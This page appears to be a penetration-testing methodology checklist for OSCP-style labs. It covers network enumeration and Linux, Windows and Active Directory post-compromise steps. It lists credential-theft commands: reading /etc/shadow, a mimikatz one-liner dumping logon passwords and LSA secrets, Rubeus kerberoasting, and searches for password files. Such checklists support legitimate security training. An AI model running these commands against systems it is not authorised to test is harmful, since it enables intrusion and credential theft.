---
layout: default
title: "Methodology Checklist"
parent: "Reference"
nav_order: 10
---

# Methodology & Checklists

**Remember: Enumerate deeply, exploit simply.**

---

## When You're Stuck (Enumeration Strategy)

### Did You Do All of These?
```bash
sudo nmap -v -p- -sC -sV $IP
sudo nmap -sU $IP
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u '' -p '' --users
nxc ldap $IP -u '' -p '' -M get-desc-users
nxc ldap $IP -u '' -p '' --password-not-required --admin-count --users --groups
enum4linux -a $IP
```

### Web Server Checks
- Did you fuzz for extensions? (`--extensions php,rb,txt` in feroxbuster)
- Did you check for subdomains (not just subdirectories)?
- Did you add the domain name to `/etc/hosts`?
- If you see a real blog post (not Lorem Ipsum), read it — hints may be there

### Other Tips
- Use `nc` to connect directly to a port to grab banners
- Upload a file to SMB/FTP and try to execute it from the web server
- Try different ports for reverse shells (specifically ports the target already has open)
- Try `domain.com/user` vs just `user` for authentication
- Try with and without `--local-auth`
- Try crackstation.net or NTLM.pw for hash lookups

### Windows Server Prioritization
When facing a Windows target with many open ports, tier your approach:

**Must Look At:**
- SMB — look for open shares; check for sensitive files
- LDAP — can you enumerate without credentials?

**If Those Fail:**
- Kerberos — can you brute-force usernames? Are any AS-REP-Roastable?
- DNS — can you do a zone transfer? Brute-force subdomains?
- RPC — is anonymous access possible?

**With Credentials:**
- WinRM — if user is in Remote Management Users group → shell

---

## Initial Enumeration Checklist

```
- [ ] nmap $IP
- [ ] nmap -p- $IP -T4
- [ ] nmap -p$ports -sC -A -T4 $IP -oN nmap
- [ ] nmap -sU -T4 $IP
- [ ] smbclient -L \\$IP\ -N
- [ ] ftp anonymous@$IP
- [ ] nxc smb -u '' -p '' $IP   (helps get domain name)
- [ ] Add box name to users.txt and passwords.txt
```

---

## Linux Post-Compromise Checklist

```
- [ ] ./vbenum.sh
- [ ] ./linpeas.sh
- [ ] ./lse.sh -l1
- [ ] ps aux | grep -i 'root' --color=auto
- [ ] ./pspy64
- [ ] ls /opt
- [ ] ls /var/www/html (or equivalent web directory)
- [ ] tree /home
- [ ] find / -perm -u=s -type f 2>/dev/null          (SUID binaries)
- [ ] find / -writable -type d 2>/dev/null            (writable directories)
- [ ] find / -type f -name *.conf 2>/dev/null
- [ ] find / -type f -name *pass* 2>/dev/null
- [ ] sudo -l
- [ ] cat /etc/passwd
- [ ] cat /etc/shadow
```

---

## Windows Post-Compromise Checklist

```
- [ ] Is there anything unusual in C:\?
- [ ] Is there anything unusual in C:\Program Files?
- [ ] systeminfo
- [ ] powershell Get-History
- [ ] whoami /priv
- [ ] whoami /groups
- [ ] Get-Content "$HOME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
- [ ] .\winpeas.exe
- [ ] tree /a /f C:\Users   (look for anything that sticks out)
- [ ] Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
- [ ] Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
- [ ] Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

---

## Active Directory Post-Compromise Checklist

```
- [ ] .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit"
- [ ] .\Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:hashes.kerberoast
- [ ] .\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:hashes.asreproast
- [ ] Import-Module .\adPEAS.ps1 then Invoke-adPEAS
- [ ] bloodhound-python -u $user -p '$password' -ns $ip -d domain.offsec -c all
- [ ] .\adPEAS-Light.ps1
- [ ] Did you get all domain users? sudo nxc smb $IP -u $user -p $password --users
```
